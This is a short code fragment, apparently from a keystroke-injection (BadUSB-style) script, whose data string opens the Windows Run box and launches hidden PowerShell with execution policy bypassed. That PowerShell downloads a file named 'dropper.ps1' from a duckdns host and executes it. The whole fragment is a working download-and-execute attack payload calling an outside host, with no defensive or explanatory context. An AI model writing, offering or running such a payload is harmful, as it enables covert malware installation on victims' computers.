...
data = """\RUNBOX
powershell.exe -executionpolicy bypass -w hidden "Invoke-Expression(New-Object System.Net.WebClient).DownloadString('https://rapid.tlnas.duckdns.org/uploads/dropper.ps1')"
\ENTER"""
